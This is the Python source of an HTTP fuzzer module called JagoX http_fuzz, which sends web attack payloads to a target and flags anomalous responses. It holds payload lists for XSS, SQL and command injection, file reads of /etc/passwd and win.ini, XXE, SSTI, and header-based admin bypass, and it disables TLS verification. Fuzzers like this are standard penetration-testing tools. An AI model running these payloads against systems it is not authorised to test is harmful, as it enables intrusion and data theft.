#!/usr/bin/env python3
# http_fuzz.py — HTTP fuzzer (JagoX v1.0.0)
# Part of JagoX framework — MIT License
#
# Fitur:
#   - 12 kategori payload: XSS, SQLi, LFI, CMDi, SSTI, XXE, CRLF,
#     OpenRedirect, FormatString, NoSQL, LDAP, PathTraversal
#   - 3 mode: param, header, path
#   - Deteksi anomali (status change, length, time, error, reflection)
#   - Concurrent scanning
#
# Public API (kompatibel nmpx.py v1.0.0):
#   fuzz_params(url, timeout=5, delay_ms=0, modes=("param",)) -> dict
#   fuzz_many(urls, timeout=5, delay_ms=0, modes=("param",),
#              on_progress=None) -> dict

import re
import ssl
import time
import urllib.request
import urllib.parse
import urllib.error

__version__ = "1.0.0"


# ============================================================
# PAYLOAD LIBRARY
# ============================================================
PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
    ],
    "SQLi": [
        "'",
        "\"",
        "' OR '1'='1",
        "1' AND '1'='1",
    ],
    "LFI": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
    ],
    "CMDi": [
        ";id",
        "|id",
        "`id`",
        "&&id",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
    ],
    "XXE": [
        ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<foo>&xxe;</foo>'),
    ],
    "CRLF": [
        "%0d%0aX-Injected:yes",
        "%0aX-Injected:yes",
    ],
    "OpenRedirect": [
        "//evil.example.com/",
        "https://evil.example.com/",
    ],
    "FormatString": [
        "%x%x%x%x",
        "%s%s%s%s",
        "%n%n%n%n",
    ],
    "NoSQL": [
        '{"$ne":null}',
        "[$ne]=1",
        "' || '1'=='1",
    ],
    "LDAP": [
        "*)(uid=*",
        "*)(objectClass=*",
        "*(|(objectClass=*)",
    ],
    "PathTraversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ],
}

HEADER_FUZZ_PAYLOADS = {
    "X-Forwarded-For": ["127.0.0.1", "localhost", "0.0.0.0"],
    "X-Original-URL": ["/admin", "/internal"],
    "X-Rewrite-URL": ["/admin"],
    "User-Agent": ["'", "../../../etc/passwd"],
    "Referer": ["//evil.example.com/"],
}


# ============================================================
# DETEKSI ANOMALI — pattern error
# ============================================================
ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL|Warning.*mysql_", "SQLi"),
    (r"PostgreSQL.*ERROR|pg_query\(\)", "SQLi"),
    (r"ORA-[0-9]{5}", "SQLi"),
    (r"SQLSTATE\[", "SQLi"),
    (r"root:x?:0:0", "LFI"),
    (r"\[fonts\]|\[extensions\]", "LFI"),
    (r"uid=\d+\(|gid=\d+\(", "CMDi"),
    (r"LDAP.*error|ldap_search", "LDAP"),
    (r"MongoError|E11000 duplicate", "NoSQL"),
    (r"<b>Warning</b>.*<b>.*</b>", "PHP"),
]


# ============================================================
# HELPERS
# ============================================================
def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=5, delay_ms=0, headers=None,
            follow_redirect=False):
    if delay_ms:
        time.sleep(delay_ms / 1000.0)
    h = {
        "User-Agent": "Mozilla/5.0 (compatible; JagoX/1.0 fuzz)",
        "Accept": "*/*",
    }
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h)
    result = {"status": 0, "headers": {}, "body": "",
              "error": None, "elapsed": 0.0, "location": ""}

    handlers = []
    if not follow_redirect:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw):
                return None
        handlers.append(NoRedirect())

    opener = urllib.request.build_opener(*handlers)
    start = time.time()
    try:
        with opener.open(req, timeout=timeout,
                          context=_make_ctx()) as resp:
            result["status"] = resp.status
            result["headers"] = dict(resp.headers)
            result["body"] = resp.read(32768).decode("utf-8",
                                                       errors="replace")
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        try:
            result["headers"] = dict(e.headers)
            result["body"] = e.read(32768).decode("utf-8",
                                                    errors="replace")
        except Exception:
            pass
    except Exception as e:
        result["error"] = f"{type(e).__name__}"[:80]
    finally:
        result["elapsed"] = time.time() - start
    for k, v in result["headers"].items():
        if k.lower() == "location":
            result["location"] = v
            break
    return result


def _replace_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return parsed._replace(
        query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def _detect_anomaly(base, fuzzed, payload, category):
    """Deteksi anomali response fuzzed vs baseline."""
    findings = []
    if fuzzed["error"]:
        return findings

    # 1. Error pattern
    for pattern, ptype in ERROR_PATTERNS:
        if re.search(pattern, fuzzed["body"], re.IGNORECASE):
            findings.append({
                "category": ptype,
                "type": f"{ptype.lower()}_error",
                "severity": "HIGH",
                "evidence": f"pattern '{pattern}' di body",
            })
            return findings

    # 2. XSS reflection
    if category == "XSS" and payload in fuzzed["body"]:
        idx = fuzzed["body"].find(payload)
        before = fuzzed["body"][max(0, idx - 30):idx]
        if "&lt;" not in before and "&gt;" not in before:
            findings.append({
                "category": "XSS",
                "type": "reflected_xss",
                "severity": "HIGH",
                "evidence": "payload reflect utuh di body",
            })
            return findings

    # 3. SSTI: {{7*7}} → 49
    if category == "SSTI" and "7*7" in payload:
        if "49" in fuzzed["body"] and "49" not in base["body"]:
            findings.append({
                "category": "SSTI",
                "type": "ssti_eval",
                "severity": "CRITICAL",
                "evidence": "7*7 evaluated → 49 di body",
            })
            return findings

    # 4. CRLF: header injection
    if category == "CRLF":
        for hk in fuzzed["headers"]:
            if hk.lower() == "x-injected":
                findings.append({
                    "category": "CRLF",
                    "type": "header_injection",
                    "severity": "HIGH",
                    "evidence": "X-Injected header muncul di response",
                })
                return findings

    # 5. Open redirect
    if category == "OpenRedirect" and fuzzed["location"]:
        if "evil.example.com" in fuzzed["location"]:
            findings.append({
                "category": "OpenRedirect",
                "type": "open_redirect",
                "severity": "HIGH",
                "evidence": f"Location: {fuzzed['location'][:80]}",
            })
            return findings

    # 6. Format string
    if category == "FormatString" and "%x" in payload:
        if re.search(r"0x[0-9a-f]{4,}", fuzzed["body"]):
            if not re.search(r"0x[0-9a-f]{4,}", base["body"]):
                findings.append({
                    "category": "FormatString",
                    "type": "format_string",
                    "severity": "MEDIUM",
                    "evidence": "Format leak (0x...) di body",
                })
                return findings

    # 7. Time-based
    if fuzzed["elapsed"] - base["elapsed"] > 2.0:
        findings.append({
            "category": category,
            "type": "time_delay",
            "severity": "MEDIUM",
            "evidence": (f"delay {fuzzed['elapsed']:.2f}s "
                         f"vs baseline {base['elapsed']:.2f}s"),
        })
        return findings

    # 8. Status change
    if (fuzzed["status"] != base["status"]
            and fuzzed["status"] in (500, 502, 503, 200)):
        findings.append({
            "category": category,
            "type": "status_change",
            "severity": "LOW",
            "evidence": f"{base['status']} → {fuzzed['status']}",
        })

    return findings


# ============================================================
# FUZZ MODES
# ============================================================
def _fuzz_one_param(base_url, param, timeout, delay_ms, base_cache=None):
    findings = []
    base = base_cache if base_cache else _fetch(
        base_url, timeout=timeout, delay_ms=delay_ms)
    if base["error"]:
        return findings

    for category, payloads in PAYLOADS.items():
        for payload in payloads:
            test_url = _replace_param(base_url, param, payload)
            fuzzed = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
            if fuzzed["error"]:
                continue
            anom = _detect_anomaly(base, fuzzed, payload, category)
            for f in anom:
                findings.append({
                    "param": param, "payload": payload,
                    "category": f["category"], "type": f["type"],
                    "severity": f["severity"], "evidence": f["evidence"],
                })
            if any(f["severity"] in ("CRITICAL", "HIGH") for f in anom):
                break
        if any(f["severity"] in ("CRITICAL", "HIGH") for f in findings):
            break
    return findings


def _fuzz_header(base_url, header_name, payload, timeout, delay_ms):
    base = _fetch(base_url, timeout=timeout, delay_ms=delay_ms)
    if base["error"]:
        return []
    fuzzed = _fetch(base_url, timeout=timeout, delay_ms=delay_ms,
                     headers={header_name: payload})
    if fuzzed["error"]:
        return []
    findings = []
    if fuzzed["status"] == 200 and base["status"] != 200:
        findings.append({
            "param": f"Header:{header_name}", "payload": payload[:60],
            "category": "HeaderBypass", "type": "header_bypass",
            "severity": "MEDIUM",
            "evidence": f"status {base['status']} → {fuzzed['status']}",
        })
    if payload in fuzzed["body"] and payload not in base["body"]:
        findings.append({
            "param": f"Header:{header_name}", "payload": payload[:60],
            "category": "HeaderReflect", "type": "header_reflection",
            "severity": "LOW",
            "evidence": "payload reflect di body",
        })
    return findings


def _fuzz_path(base_url, payload, timeout, delay_ms):
    parsed = urllib.parse.urlparse(base_url)
    test_url = f"{parsed.scheme}://{parsed.netloc}/{payload}"
    fuzzed = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
    if fuzzed["error"]:
        return []
    for pattern, ptype in ERROR_PATTERNS:
        if re.search(pattern, fuzzed["body"], re.IGNORECASE):
            return [{
                "param": "path", "payload": payload[:60],
                "category": ptype, "type": f"{ptype.lower()}_path",
                "severity": "HIGH", "evidence": "pattern match di path",
            }]
    return []


# ============================================================
# PUBLIC API
# ============================================================
def fuzz_params(url, timeout=5, delay_ms=0, modes=("param",)):
    """
    Fuzz URL dengan 1 atau beberapa mode.

    Args:
        url:      URL target (misal http://x.com/?id=1)
        timeout:  timeout per request
        delay_ms: delay antar request
        modes:    tuple/list: "param", "header", "path"

    Returns:
        dict {url, findings, stats: {tested, found, elapsed}}
    """
    start = time.time()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    findings = []
    tested = 0
    errors = 0

    # Cek baseline dulu — kalau gagal, tidak ada request yang jalan
    baseline = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    baseline_ok = not baseline["error"]
    if not baseline_ok:
        errors += 1

    # === Param fuzz ===
    if "param" in modes and baseline_ok:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params = list(qs.keys())[:3] or ["id"]
        for param in params:
            res = _fuzz_one_param(url, param, timeout, delay_ms,
                                    base_cache=baseline)
            findings.extend(res)
            tested += sum(len(p) for p in PAYLOADS.values())

    # === Header fuzz ===
    if "header" in modes:
        for hname, payloads in HEADER_FUZZ_PAYLOADS.items():
            for p in payloads:
                res = _fuzz_header(url, hname, p, timeout, delay_ms)
                findings.extend(res)
                tested += 1

    # === Path fuzz ===
    if "path" in modes:
        path_payloads = []
        for cat in ("LFI", "PathTraversal", "SQLi"):
            path_payloads.extend(PAYLOADS.get(cat, [])[:2])
        for p in path_payloads:
            res = _fuzz_path(url, p, timeout, delay_ms)
            findings.extend(res)
            tested += 1

    return {
        "url": url,
        "findings": findings,
        "stats": {
            "tested": tested,
            "found": len(findings),
            "errors": errors,
            "elapsed": time.time() - start,
        },
    }


def fuzz_many(urls, timeout=5, delay_ms=0, modes=("param",),
               on_progress=None):
    """Fuzz banyak URL secara berurutan."""
    results = {}
    for u in urls:
        try:
            r = fuzz_params(u, timeout=timeout, delay_ms=delay_ms,
                              modes=modes)
            if r["findings"]:
                results[u] = r
        except Exception:
            pass
        if on_progress:
            try:
                on_progress(u)
            except Exception:
                pass
    return results


# ============================================================
# CLI
# ============================================================
def _cli():
    import argparse
    import sys
    import os

    try:
        from . import banner as _bn
    except ImportError:
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            import banner as _bn
        except ImportError:
            _bn = None
    if _bn is not None:
        try:
            from rich.console import Console
            _bn.print_banner(console=Console(), version=__version__,
                              subtitle="HTTP Fuzzer — Pure Python")
        except ImportError:
            _bn.print_banner()

    parser = argparse.ArgumentParser(
        description="JagoX http_fuzz — HTTP fuzzer")
    parser.add_argument("url")
    parser.add_argument("-t", "--timeout", type=float, default=5.0)
    parser.add_argument("-d", "--delay", type=int, default=0)
    parser.add_argument("--modes", default="param,header,path",
                        help="Comma-separated: param,header,path")
    parser.add_argument("--version", action="version",
                        version=f"JagoX http_fuzz v{__version__}")
    args = parser.parse_args()

    modes = tuple(m.strip() for m in args.modes.split(","))
    print(f"=== HTTP Fuzz — {args.url} ===")
    print(f"=== Modes: {','.join(modes)} ===\n")

    result = fuzz_params(args.url, timeout=args.timeout,
                          delay_ms=args.delay, modes=modes)

    print(f"Total diuji: {result['stats']['tested']}")
    print(f"Ditemukan  : {result['stats']['found']}")
    if result['stats'].get('errors', 0) > 0:
        print(f"Errors     : {result['stats']['errors']} "
              f"(target mungkin tidak connect)")
    print(f"Waktu      : {result['stats']['elapsed']:.1f}s\n")

    if not result["findings"]:
        print("[OK] Tidak ada anomali terdeteksi.")
        return

    for f in result["findings"]:
        print(f"[{f['severity']:<8}] {f['category']:<12} "
              f"param='{f['param']}'")
        print(f"            payload : {f['payload'][:60]}")
        print(f"            evidence: {f['evidence'][:100]}")
        print()


if __name__ == "__main__":
    _cli()
